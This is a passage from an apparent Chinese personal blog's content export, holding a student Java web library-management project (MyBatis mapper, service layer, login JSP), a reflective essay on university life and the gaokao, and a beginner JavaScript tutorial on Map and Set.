class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">mapper</span></span><br><span class="hljs-meta">        <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-meta-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.hu.Mapper.adminMapper&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">insert</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;addadmin&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;admin&quot;</span>&gt;</span><br>    insert into library.admin(admin_id,password,username) values(#&#123;admin_id&#125;,#&#123;password&#125;,#&#123;username&#125;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">insert</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">delete</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;deleteadminById&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;int&quot;</span>&gt;</span><br>        delete<br>        from library.admin<br>        where admin_id = #&#123;admin_id&#125;;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">delete</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">update</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;updateadmin&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;admin&quot;</span>&gt;</span><br>        update library.admin<br>        set admin_id = #&#123;admin_id&#125;,password=#&#123;password&#125;,username=#&#123;username&#125;<br>        where admin_id=#&#123;admin_id&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">update</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;queryadminById&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;int&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;admin&quot;</span>&gt;</span><br>        select * from library.admin where admin_id = #&#123;admin_id&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;queryAlladmin&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;admin&quot;</span>&gt;</span><br>        select * from library.admin<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Service层：</p><ul><li>adminService.class</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hu.service;<br><br><span class="hljs-keyword">import</span> com.hu.pojo.admin;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">adminService</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">addadmin</span><span class="hljs-params">(admin admin)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">deleteadminById</span><span class="hljs-params">(<span class="hljs-keyword">int</span> id)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">updateadmin</span><span class="hljs-params">(admin admin)</span></span>;<br>    <span class="hljs-function">admin <span class="hljs-title">queryadminById</span><span class="hljs-params">(<span class="hljs-keyword">int</span> id)</span></span>;<br>    <span class="hljs-function">List&lt;admin&gt; <span class="hljs-title">queryAlladmin</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function">admin <span class="hljs-title">checkLogin</span><span class="hljs-params">(<span class="hljs-keyword">int</span> admin_id,String password)</span></span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>adminServicelmpl.class</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hu.service;<br><br><span class="hljs-keyword">import</span> com.hu.Mapper.adminMapper;<br><span class="hljs-keyword">import</span> com.hu.Mapper.bookMapper;<br><span class="hljs-keyword">import</span> com.hu.pojo.admin;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">adminServicelmpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">adminService</span></span>&#123;<br><br>    <span class="hljs-keyword">private</span> adminMapper adminMapper;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setAdminMapper</span><span class="hljs-params">(adminMapper adminMapper)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.adminMapper = adminMapper;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">addadmin</span><span class="hljs-params">(admin admin)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> adminMapper.addadmin(admin);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">deleteadminById</span><span class="hljs-params">(<span class="hljs-keyword">int</span> id)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> adminMapper.deleteadminById(id);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">updateadmin</span><span class="hljs-params">(admin admin)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> adminMapper.updateadmin(admin);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> admin <span class="hljs-title">queryadminById</span><span class="hljs-params">(<span class="hljs-keyword">int</span> id)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> adminMapper.queryadminById(id);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;admin&gt; <span class="hljs-title">queryAlladmin</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> adminMapper.queryAlladmin();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> admin <span class="hljs-title">checkLogin</span><span class="hljs-params">(<span class="hljs-keyword">int</span> admin_id, String password)</span> </span>&#123;<br>        admin admin = adminMapper.queryadminById(admin_id);<br>        <span class="hljs-keyword">if</span>(admin!=<span class="hljs-keyword">null</span>&amp;&amp;admin.getPassword().equals(password))&#123;<br>            <span class="hljs-keyword">return</span> admin;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>web层：</p><p>login.jsp</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;%--<br>  Created by IntelliJ IDEA.<br>  User: <span class="hljs-number">10251</span><br>  <span class="hljs-built_in">Date</span>: <span class="hljs-number">2021</span>/<span class="hljs-number">6</span>/<span class="hljs-number">9</span><br>  Time: <span class="hljs-number">22</span>:<span class="hljs-number">43</span><br>  To change <span class="hljs-built_in">this</span> template use File | Settings | File Templates.<br>--%&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;!DOCTYPE html&gt;<br>&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;title&gt;图书管理系统&lt;/title&gt;<br>    &lt;link rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;../css/bootstrap.min.css&quot;</span>&gt;<br>    &lt;script src=<span class="hljs-string">&quot;../js/JQuery.js&quot;</span>&gt;&lt;/script&gt;<br>    &lt;style&gt;<br>        .form-control&#123;<br>            width: 443px;<br>        &#125;<br>        .btn-success&#123;<br>            width: 150px;<br>        &#125;<br>        .btn-warning&#123;<br>            width: 150px;<br>        &#125;<br>        .form-group&#123;<br>            margin: 5px;<br>            padding: 10px;<br>            padding-left: 375px;<br>        &#125;<br>        .form-horizontal&#123;<br>            padding-top: 180px;<br>        &#125;<br><br>    &lt;/style&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;nav <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;navbar navbar-default navbar-fixed-top&quot;</span> role=<span class="hljs-string">&quot;navigation&quot;</span>&gt;<br>    &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;container&quot;</span>&gt;<br>        &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;navbar-header&quot;</span>&gt;<br>            &lt;a href=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;navbar-brand&quot;</span>&gt;自由而无用&lt;/a&gt;<br>        &lt;/div&gt;<br>        &lt;div id=<span class="hljs-string">&quot;navbar&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;collapse navbar-collapse&quot;</span>&gt;<br>            &lt;ul <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;nav navbar-nav&quot;</span>&gt;<br>                &lt;li&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;$&#123;pageContext.request.contextPath&#125;&quot;</span>&gt;</span>首页<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span>&lt;/li&gt;<br>                &lt;li <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;active&quot;</span>&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>图书管理系统<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span>&lt;/li&gt;<br>                &lt;li&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;$&#123;pageContext.request.contextPath&#125;/book/about&quot;</span>&gt;</span>关于我<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span>&lt;/li&gt;<br>            &lt;/ul&gt;<br>        &lt;/div&gt;<br>    &lt;/div&gt;<br>&lt;/nav&gt;<br><br>&lt;form action=<span class="hljs-string">&quot;$&#123;pageContext.request.contextPath&#125;/book/book_manage_2&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;form-horizontal &quot;</span> role=<span class="hljs-string">&quot;form&quot;</span>&gt;<br>    &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;<br>        &lt;label <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;col-sm-2 control-label&quot;</span>&gt;账号：&lt;/label&gt;<br>        &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;col-sm-10&quot;</span>&gt;<br>            &lt;input id=<span class="hljs-string">&quot;zh&quot;</span> type=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;form-control&quot;</span> placeholder=<span class="hljs-string">&quot;账号&quot;</span> name=<span class="hljs-string">&quot;admin_id&quot;</span>&gt;<br>        &lt;/div&gt;<br>    &lt;/div&gt;<br>    &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;<br>        &lt;label id=<span class="hljs-string">&quot;pwd&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;col-sm-2 control-label&quot;</span>&gt;密码：&lt;/label&gt;<br>        &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;col-sm-10&quot;</span>&gt;<br>            &lt;input id=<span class="hljs-string">&quot;pwd_real&quot;</span> type=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;form-control&quot;</span> placeholder=<span class="hljs-string">&quot;密码&quot;</span> name=<span class="hljs-string">&quot;password&quot;</span>&gt;<br>        &lt;/div&gt;<br>    &lt;/div&gt;<br>    &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;<br>        &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;col-sm-offset-2 col-sm-10&quot;</span>&gt;<br>            &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;checkbox&quot;</span>&gt;<br>                &lt;label&gt;<br>                    &lt;input type=<span class="hljs-string">&quot;checkbox&quot;</span>&gt;记住密码<br>                &lt;/label&gt;<br>            &lt;/div&gt;<br>        &lt;/div&gt;<br>    &lt;/div&gt;<br>    &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;<br>        &lt;div  <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;col-sm-offset-2 col-sm-2&quot;</span>&gt;<br>            &lt;button id=<span class="hljs-string">&quot;login&quot;</span> type=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;btn btn-success&quot;</span>&gt; 登录 &lt;/button&gt;<br>        &lt;/div&gt;<br>        &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot; col-sm-offset-5&quot;</span>&gt;<br>            &lt;button id=<span class="hljs-string">&quot;forget&quot;</span> type=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;btn btn-warning&quot;</span>&gt;忘记密码&lt;/button&gt;<br>        &lt;/div&gt;<br>    &lt;/div&gt;<br>&lt;/form&gt;<br>&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>    $(<span class="hljs-string">&quot;#login&quot;</span>).click(<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkpwdAndzh</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">var</span> name = $(<span class="hljs-string">&quot;#zh&quot;</span>).val();<br>        <span class="hljs-keyword">var</span> pass = $(<span class="hljs-string">&quot;#pwd_real&quot;</span>).val();<br>        <span class="hljs-keyword">if</span> (name == <span class="hljs-string">&quot;&quot;</span>) &#123;<br>            alert(<span class="hljs-string">&quot;用户名不能为空&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pass == <span class="hljs-string">&quot;&quot;</span>) &#123;<br>            alert(<span class="hljs-string">&quot;密码不能为空&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;);<br>    <span class="hljs-keyword">var</span> v =<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(($&#123;v&#125;)==<span class="hljs-string">&quot;-1&quot;</span>)<br>        alert(<span class="hljs-string">&quot;密码或账号错误&quot;</span>);<br><br>&lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 项目实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web开发 </tag>
            
            <tag> 框架 </tag>
            
            <tag> BootStrap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>回首与展望</title>
      <link href="/2021/06/06/%E5%9B%9E%E9%A6%96%E4%B8%8E%E5%B1%95%E6%9C%9B/"/>
      <url>/2021/06/06/%E5%9B%9E%E9%A6%96%E4%B8%8E%E5%B1%95%E6%9C%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="一段并不出彩的大学生活"><a href="#一段并不出彩的大学生活" class="headerlink" title="一段并不出彩的大学生活"></a>一段并不出彩的大学生活</h2><p>19年高考已经是两年前的事了，时间就这样悄然消逝，无声无息。</p><p>此刻我坐在书桌前，回忆两年来在大学里做过的事。翘课、吃饭、散步、睡觉。好像，只有这些事，但好像又不止这些事。</p><p>来之不易的大学生活已经变得稀松平常，以至于我已经忘了备考时的紧张，就感觉，高考嘛，也没什么了不起的。可是高考对当时的我来说，的的确确就是生命中最重要的事。是因为时间冲淡了记忆，让之前自以为无比重要的时刻变得没那么重要，还是因为，它确实没那么重要呢？我想，处于不同人生阶段的人会有不同的看法。对于高中生而言，高考就是此刻人生中的头等大事。对于我这种人而言，高考就有些遥远了，自己已经习惯了大学的这种生活，所以就也没那么重要。而对于毕了业没找到工作的毕业生而言，他可能会把不如意的原因归到高考这件事上，高考就又是无比重要的事情了。所以，高考重不重要这件事本身并没有意义，它更像是逃避问题的一个借口。</p><p>去武汉的火车是在凌晨发车，中午抵达的。我坐在车窗前，贪婪的享受着窗外的群山从漆黑到青葱的过程。我并不急于到达，却又对武汉心心念念。我想多看看层峦叠翠，又想下一刻就在吃热干面。我痴醉于过程，却又想早点品尝结果。这就好比高考的时候，不想毕业，又想早点上大学。过程和结果好像一样重要。只不过我们如此渴望结果，于是开始忽视过程。但，结果又是下一个过程的过程。与其说我们在追求最好的结果，不如说我们在追求完美的过程。什么是完美的结果？在我们的教育体系下，比所有人好的结果就是完美的结果，也可以说比所有人都好的过程，就是完美的过程。而我们是如何比较好坏的呢？这就又要牵扯出价值的评判标准了。</p><p>我常常在路上思考价值的评判标准。以前衡量一个学生的价值，基本上是用成绩衡量的。现在去衡量一个学生的价值，就不光要看绩点，还要看竞赛成绩、科研成果种种。到衡量社会人士这一块的价值，就要用成就和人民币斟酌了。所以对于自己而言，什么才是真正的价值？这个是要别人去衡量还是由自己定夺？问题接踵而至。</p><p>前面说，自己在大学好像不止经历了那些事。的确，我选修的课程全是和专业无关的。艺术、哲学、性教育、经济与社会，看起来屌用没有，但对我而言却如此重要。我视若珍宝的，在别人看来一文不值。我想，这一块也值得思考，对于自己而言真正的价值是否涵盖别人眼中的无意义。</p><p>那高考对于你来说重不重要呢？我想这个问题在我们此刻的人生阶段以及往后都毫无意义了。倘若非要较真，那只能看自己走的是哪条路。是追求完美，还是直面缺憾，我们心中都有答案。</p><p>高考在即，无论幸福还是痛苦，人生走的每一步都算数。</p>]]></content>
      
      
      <categories>
          
          <category> 闲言碎语 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 人生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>玩转Javascript(三)</title>
      <link href="/2021/06/05/%E7%8E%A9%E8%BD%ACJavascript-%E4%B8%89/"/>
      <url>/2021/06/05/%E7%8E%A9%E8%BD%ACJavascript-%E4%B8%89/</url>
      
        <content type="html"><![CDATA[<h2 id="前排提示"><a href="#前排提示" class="headerlink" title="前排提示"></a>前排提示</h2><p>本节包含如下几个知识点：</p><ul><li>Map和Set集合</li><li>Iterable迭代</li><li>JSON对象</li><li>jQuery</li></ul><h2 id="发车了"><a href="#发车了" class="headerlink" title="发车了"></a>发车了</h2><h3 id="Map和Set"><a href="#Map和Set" class="headerlink" title="Map和Set"></a>Map和Set</h3><p>Map：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//ES6</span><br><span class="hljs-comment">//[学生的名字，学生的成绩]</span><br><span class="hljs-comment">// var names = [&quot;tom&quot;,&quot;jack&quot;,&quot;peter&quot;];</span><br><span class="hljs-comment">// var scores = [100,90,80];</span><br><br><span class="hljs-meta">&#x27;use strict&#x27;</span>;<br><span class="hljs-keyword">var</span> map = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Map</span>([[<span class="hljs-string">&quot;tom&quot;</span>,<span class="hljs-number">100</span>],[<span class="hljs-string">&quot;jack&quot;</span>,<span class="hljs-number">90</span>],[<span class="hljs-string">&quot;peter&quot;</span>,<span class="hljs-number">80</span>]]);<br><span class="hljs-keyword">var</span> name = map.get(<span class="hljs-string">&#x27;tom&#x27;</span>);<span class="hljs-comment">//通过key值来获得value</span><br>map.set(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-number">999</span>);<span class="hljs-comment">//新增或修改</span><br>map.delete(<span class="hljs-string">&#x27;tom&#x27;</span>);<span class="hljs-comment">//删除</span><br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210605110816717.png"></p><p>Set： </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-meta">&#x27;use strict&#x27;</span>;<br><span class="hljs-keyword">var</span> set = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Set</span>([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">15</span>])<br>set.add(<span class="hljs-number">2</span>);<br>set.delete(<span class="hljs-number">1</span>);<br><span class="hljs-built_in">console</span>.log(set.has(<span class="hljs-number">3</span>))<br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210605111154184.png"></p><h3 id="Iterable迭代"><a href="#Iterable迭代" class="headerlink" title="Iterable迭代"></a>Iterable迭代</h3>]]></content>
      
      
      <categories>
          
          <category> 脚本语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web开发 </tag>
            
            <tag> Java Web </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大学生性教育结业论文</title>
      <link href="/2021/06/01/%E5%A4%A7%E5%AD%A6%E7%94%9F%E6%80%A7%E6%95%99%E8%82%B2%E7%BB%93%E4%B8%9A%E8%AE%BA%E6%96%87/"/>
      <url>/2021/06/01/%E5%A4%A7%E5%AD%A6%E7%94%9F%E6%80%A7%E6%95%99%E8%82%B2%E7%BB%93%E4%B8%9A%E8%AE%BA%E6%96%87/</url>
      
